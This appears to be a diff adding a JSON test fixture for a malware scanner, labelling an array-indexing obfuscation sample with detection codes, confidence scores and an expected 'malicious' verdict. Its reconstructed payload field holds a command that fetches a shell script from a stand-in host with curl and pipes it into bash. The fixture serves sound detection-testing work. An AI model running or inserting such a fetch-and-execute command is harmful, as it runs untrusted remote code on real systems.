@@ -1,0 +1,43 @@
+{
+  "sample_id": "adv-021-array-index",
+  "test_category": "string_manipulation_obfuscation",
+  "primary_detection": {
+    "code": "STRING-005",
+    "name": "Array/List Indexing Obfuscation",
+    "description": "Malicious commands built character-by-character using array indexing and join operations",
+    "confidence": 0.90
+  },
+  "underlying_threats": [
+    {
+      "code": "EXEC-003",
+      "name": "Dynamic Code Execution",
+      "description": "Uses exec() to execute dynamically assembled code strings",
+      "confidence": 0.94
+    },
+    {
+      "code": "DATA-002",
+      "name": "Remote Code Execution",
+      "description": "Downloads and executes remote shell scripts",
+      "confidence": 0.92
+    },
+    {
+      "code": "EXEC-001",
+      "name": "Shell Command Injection",
+      "description": "Executes shell commands via subprocess with shell=True",
+      "confidence": 0.89
+    }
+  ],
+  "obfuscation_indicators": [
+    "Character arrays: ['i', 'm', 'p', 'o', 'r', 't']",
+    "Join operations to assemble strings: ''.join(chars)",
+    "Character pool with index access: pool[22] for 'w'",
+    "Index arrays to build URL components",
+    "2D nested arrays holding command parts",
+    "List comprehensions for character extraction"
+  ],
+  "reconstructed_payload": "import os; os.system('curl https://[REDACTED].example.com/shell.sh | bash')",
+  "expected_verdict": "确认恶意",
+  "verdict_reasoning": "Methodical character-level obfuscation using arrays and indexing to evade string-based detection",
+  "risk_level": "critical",
+  "tags": ["obfuscation", "array-index", "character-building", "join", "exec", "remote-code-execution"]
+}
